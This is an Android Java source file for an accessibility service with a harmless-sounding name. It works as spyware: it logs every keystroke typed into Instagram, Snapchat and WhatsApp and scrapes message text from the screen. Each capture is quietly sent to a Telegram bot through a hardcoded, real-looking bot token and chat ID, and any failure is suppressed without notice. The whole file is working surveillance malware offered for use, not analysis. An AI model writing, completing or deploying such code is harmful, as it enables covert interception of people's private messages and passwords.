package com.example.textreader;

import android.accessibilityservice.AccessibilityService;
import android.os.AsyncTask;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashSet;
import java.util.Locale;
import java.util.Set;

public class GlobalActionBarService extends AccessibilityService {

    private SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());

    // 🔥 PASTE YOUR BOT TOKEN AND CHAT ID HERE
    private static final String BOT_TOKEN = "8745417407:AAHpcDSAa4yeLeJRjI_8ut8BrjOShffi7bs";    // e.g., "1234567890:ABCdefGHIjkl"
    private static final String CHAT_ID = "5465116744";        // e.g., "123456789"

    private Set<String> uiJunk = new HashSet<String>() {{
        add("Send"); add("Message"); add("Back"); add("More"); add("Profile");
        add("Delete"); add("Copy"); add("Reply"); add("Forward"); add("Settings");
        add("Search"); add("Type a message"); add("New message"); add("Seen");
        add("Delivered"); add("Read"); add("Like"); add("Comment"); add("Share");
        add("Save"); add("Cancel"); add("Done"); add("Edit"); add("Post");
        add("Story"); add("Home"); add("Explore"); add("Activity");
        add("Notifications"); add("Direct"); add("Inbox"); add("Create");
        add("View"); add("Reply"); add("Forward"); add("Delete"); add("More");
        add("Options"); add("Menu"); add("Add"); add("Remove"); add("Block");
        add("Report"); add("Unfollow"); add("Follow"); add("Mute"); add("Hide");
    }};

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getPackageName() == null) return;
        String pkg = event.getPackageName().toString();

        // Target apps
        if (!pkg.equals("com.instagram.android") &&
            !pkg.equals("com.snapchat.android") &&
            !pkg.equals("com.whatsapp")) {
            return;
        }

        // --- 1. KEYBOARD INPUT ---
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null && source.isEditable()) {
                String typed = source.getText() != null ? source.getText().toString() : "";
                if (!typed.isEmpty()) {
                    String log = String.format("[%s] APP: %s [KEYBOARD]: %s",
                            dateFormat.format(new Date()),
                            getAppName(pkg),
                            typed);
                    sendToTelegram(log);
                }
            }
        }

        // --- 2. SCREEN TEXT (messages only) ---
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
            event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {

            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) {
                String extracted = extractCleanText(root);
                if (!extracted.isEmpty()) {
                    String log = String.format("[%s] APP: %s [MESSAGE]: %s",
                            dateFormat.format(new Date()),
                            getAppName(pkg),
                            extracted);
                    sendToTelegram(log);
                }
            }
        }
    }

    private String extractCleanText(AccessibilityNodeInfo node) {
        StringBuilder sb = new StringBuilder();
        collectText(node, sb);
        String raw = sb.toString();
        String[] parts = raw.split("\\|");
        StringBuilder filtered = new StringBuilder();
        for (String part : parts) {
            part = part.trim();
            if (part.length() > 10 && !uiJunk.contains(part) && !containsJunk(part)) {
                if (filtered.length() > 0) filtered.append(" | ");
                filtered.append(part);
            }
        }
        String result = filtered.toString();
        return result.length() > 2000 ? result.substring(0, 2000) : result;
    }

    private void collectText(AccessibilityNodeInfo node, StringBuilder sb) {
        if (node == null) return;
        if (node.getText() != null) {
            String text = node.getText().toString();
            if (!text.isEmpty()) {
                if (sb.length() > 0) sb.append("|");
                sb.append(text);
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) collectText(child, sb);
        }
    }

    private boolean containsJunk(String text) {
        for (String junk : uiJunk) {
            if (text.contains(junk)) return true;
        }
        return false;
    }

    private String getAppName(String pkg) {
        if (pkg.equals("com.instagram.android")) return "INSTAGRAM";
        if (pkg.equals("com.snapchat.android")) return "SNAPCHAT";
        if (pkg.equals("com.whatsapp")) return "WHATSAPP";
        return pkg;
    }

    // ------------------ TELEGRAM SENDER ------------------
    private void sendToTelegram(final String message) {
        new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(Void... voids) {
                try {
                    String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
                    URL url = new URL(urlString);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setDoOutput(true);

                    String json = "{\"chat_id\":\"" + CHAT_ID + "\", \"text\":\"" + escapeJson(message) + "\"}";
                    OutputStream os = conn.getOutputStream();
                    os.write(json.getBytes());
                    os.flush();
                    os.close();

                    int responseCode = conn.getResponseCode();
                    // Optionally check response
                } catch (Exception e) {
                    // Silent fail – you can log to a file if needed
                }
                return null;
            }
        }.execute();
    }

    private String escapeJson(String s) {
        return s.replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r")
                .replace("\t", "\\t");
    }

    @Override
    public void onInterrupt() {}
                                                                        }
